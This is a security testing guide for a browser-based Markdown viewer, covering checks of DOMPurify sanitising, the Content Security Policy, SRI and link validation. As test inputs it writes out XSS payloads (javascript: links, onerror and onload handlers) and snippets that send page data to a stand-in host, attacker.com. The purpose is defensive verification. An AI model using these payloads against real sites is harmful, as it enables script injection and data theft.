# Security Testing Guide for Markdown Explorer

This guide helps you verify that the security fixes are working correctly.

---

## 1️⃣ Testing XSS Protection via DOMPurify

### Test Case 1: JavaScript in Link (Should be blocked)

Create a test file `security_test.md`:

```markdown
# XSS Test Suite

## Test 1: Dangerous Link
[Click me - XSS via javascript:](javascript:alert('XSS via link'))

## Test 2: Image Tag with onerror
<img src=x onerror="alert('XSS via img onerror')">

## Test 3: Script Tag
<script>alert('XSS via script tag')</script>

## Test 4: SVG Handler
<svg onload="alert('XSS via SVG onload')"></svg>

## Test 5: Form Action
<form action="javascript:alert('XSS via form')"><input type="submit"></form>
```

### Expected Behavior:
- Open the markdown file in Markdown Explorer
- **NO alerts should appear** ✅
- Content should still be readable
- Check DevTools Console → No errors

### What's Happening:
```
1. marked.js parses markdown → HTML
2. DOMPurify sanitizes → Removes dangerous tags/attributes
3. Safe HTML is rendered
4. XSS payloads are neutralized ✅
```

---

## 2️⃣ Testing Content Security Policy (CSP)

### How to Verify CSP is Active:

1. **Open DevTools** (F12)
2. **Go to Console tab**
3. **Try injecting malicious script:**
   ```javascript
   // Open console and paste:
   fetch('https://attacker.com/steal?data=' + JSON.stringify(window.tabs))
   ```

### Expected Behavior:
- **Error appears in console:**
   ```
   Refused to connect to 'https://attacker.com' because it violates the 
   Content Security Policy directive: "connect-src 'none'".
   ```
- Request is **blocked** ✅
- No data is sent ✅

### Other CSP Violations to Test:

**Attempt 1: Load external script**
```javascript
// In console:
const s = document.createElement('script');
s.src = 'https://attacker.com/malware.js';
document.head.appendChild(s);
```
Expected: Blocked by CSP (script-src only allows approved CDNs) ✅

**Attempt 2: Form submission to attacker**
```javascript
// In console:
const form = document.createElement('form');
form.action = 'https://attacker.com/collect';
form.method = 'POST';
document.body.appendChild(form);
form.submit();
```
Expected: Blocked by CSP (form-action 'none') ✅

---

## 3️⃣ Testing Subresource Integrity (SRI)

### Verify marked.js Checksum:

1. **Open DevTools → Network tab**
2. **Reload the page**
3. **Click on marked.min.js request**
4. **Check Response Headers**

You should see the script loaded successfully with the SRI checksum verified.

### How to Test SRI Rejection:

This is advanced testing. To verify SRI would reject tampered content:

1. **Modify the HTML temporarily** (test only):
   ```html
   <!-- Change the integrity checksum to an invalid value: -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/13.0.1/marked.min.js"
           integrity="sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
           crossorigin="anonymous"></script>
   ```

2. **Reload → Expected behavior:**
   - marked.js fails to load
   - Console shows: `Refused to execute script because of Content Security Policy`
   - App still functions, but markdown won't render ✅

---

## 4️⃣ Testing File Validation

### Test Case 1: File Size Limit

1. Create a large test file (e.g., `large.md` with 15MB of content)
2. Try to open the folder containing it
3. **Expected:** File is skipped, warning in console (if DEBUG=true)

### Test Case 2: Wrong File Extension

1. Create a test file: `malware.txt` or `evil.exe`
2. Try to open the folder
3. **Expected:** File is skipped, not displayed in file explorer

### Test Case 3: Rename Attack

1. Create `attack.exe` (or any binary)
2. Rename to `document.md`
3. Try to open the folder
4. **Note:** Extension check will pass (attacker already controls filesystem)
5. **Protection:** The browser's FileReader will fail to parse binary as text, resulting in garbled markdown

---

## 5️⃣ Testing Link Validation

### Create Test File: `links_test.md`

```markdown
# Link Validation Tests

## Safe Links (Should work)
- [Internal heading](#heading-1)
- [Other document](other.md)
- [Cross-document anchor](other.md#section-name)
- [External site](https://example.com)

## Dangerous Links (Should be blocked)
- [JavaScript protocol](javascript:alert('XSS'))
- [Data URI](data:text/html,<script>alert('xss')</script>)
- [Form action to attacker](form:https://attacker.com)

## Heading 1
Regular content here
```

### Expected Behavior:
- Safe links work normally ✅
- Dangerous links are silently blocked (no error, just no action) ✅
- Check console (if DEBUG=true) to see blocked links

---

## 6️⃣ Testing Debug Mode

### Disable Debug Logs:
```javascript
// Current setting in markdown_explorer_secure.html:
const DEBUG = false;  // ← Logs are disabled
```

### Enable for Testing:
```javascript
const DEBUG = true;  // ← Now you'll see logs
```

### What to Expect with DEBUG=true:
- Console shows all navigation info
- File paths are visible
- Anchor resolution shown step-by-step

### What to Expect with DEBUG=false:
- Console is clean (no logs)
- Errors still appear if something breaks
- Perfect for production use ✅

---

## 7️⃣ Automated Security Headers Check

### Firefox Developer Tools:

1. **Open DevTools (F12)**
2. **Go to Inspector → Storage tab**
3. **Look for CSP in Document section**

### Chrome DevTools:

1. **Open DevTools (F12)**
2. **Go to Application → Manifest**
3. **CSP is applied via `<meta>` tag**
4. **Open Console** → Look for any CSP violation messages

### CSP Violations Indicator:

```
⚠️ Refused to connect to 'https://bad.com' because it violates CSP
⚠️ Refused to load script because of CSP
⚠️ Refused to frame 'https://bad.com' because of CSP
```

If you see these, CSP is working! ✅

---

## 8️⃣ Real-World Attack Simulation

### Scenario: Compromised Markdown File

**Attacker's payload in `doc.md`:**
```markdown
# Important Document

[View Details](javascript:fetch('https://attacker.com/steal?data='+btoa(document.body.innerText)))

<img src=x onerror="navigator.sendBeacon('https://attacker.com/log',JSON.stringify({timestamp: new Date()}))">

<iframe src="https://attacker.com/phishing"></iframe>
```

### What Happens:
1. DOMPurify removes `javascript:` link ✅
2. `onerror` attribute is removed ✅
3. `<iframe>` tag is removed ✅
4. Document displays safely ✅
5. Zero data exfiltration ✅

### Proof:
- Open DevTools Network tab
- No requests to `attacker.com` ✅
- CSP would block them anyway ✅

---

## 9️⃣ Checklist: Verification Steps

Print this and check off as you test:

### Security Features Verification:

- [ ] **XSS Protection**
  - [ ] Test markdown with `<script>` tags → Blocked ✅
  - [ ] Test `javascript:` links → Blocked ✅
  - [ ] Test `onerror` attributes → Blocked ✅

- [ ] **CSP Enforcement**
  - [ ] Try `fetch()` to external URL → Blocked ✅
  - [ ] Try injecting external script → Blocked ✅
  - [ ] Try form submission to attacker → Blocked ✅

- [ ] **SRI Verification**
  - [ ] marked.js loads correctly ✅
  - [ ] DOMPurify loads correctly ✅

- [ ] **File Validation**
  - [ ] Large files (>10MB) are skipped ✅
  - [ ] Non-.md files are skipped ✅

- [ ] **Link Safety**
  - [ ] `javascript:` links blocked ✅
  - [ ] `data:` links blocked ✅
  - [ ] Normal links work ✅

- [ ] **Debug Security**
  - [ ] DEBUG=false hides logs ✅
  - [ ] No file paths in console ✅
  - [ ] No sensitive data in console ✅

---

## 🎯 Production Readiness

When you're confident the security features are working:

1. ✅ Leave `DEBUG = false`
2. ✅ Deploy to GitHub Pages or internal server
3. ✅ Keep both SRI checksums intact
4. ✅ Don't modify CSP unless absolutely necessary

You're good to go! 🚀

---

## 📞 Troubleshooting

### Issue: Markdown doesn't render

**Causes:**
- marked.js SRI checksum failed (check Network tab)
- DOMPurify library failed to load
- CSP blocked something

**Solution:**
- Check DevTools Console for CSP violations
- Verify both scripts loaded (Network tab)
- Temporarily set DEBUG=true to see what's happening

### Issue: Links don't work

**Possible:**
- Relative path is wrong
- CSP is overly restrictive
- Link protocol is blocked

**Solution:**
- Check Console with DEBUG=true
- Verify path resolution
- Make sure link doesn't use `javascript:` or `data:`

### Issue: CSP blocks legitimate content

**This is rare, but if it happens:**
1. Identify what's being blocked (Console shows it)
2. If it's necessary, add to CSP carefully
3. Example: Adding image from external source
   ```html
   img-src 'self' data: https://trusted-image-site.com;
   ```

---

## 📚 Further Reading

- **OWASP XSS Prevention Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **Content Security Policy Guide:** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **Subresource Integrity:** https://www.w3.org/TR/SRI/
- **DOMPurify Documentation:** https://github.com/cure53/DOMPurify

---

## Summary

The secure version of Markdown Explorer has multiple layers of protection:

1. **Input Validation** → Files checked before loading
2. **Output Sanitization** → HTML cleaned before rendering
3. **CSP Enforcement** → Dangerous operations blocked
4. **SRI Verification** → External scripts verified
5. **Protocol Blocking** → Dangerous links prevented
6. **Debug Isolation** → Logs don't leak sensitive data

This provides **defense in depth** against modern web attacks. 🔒

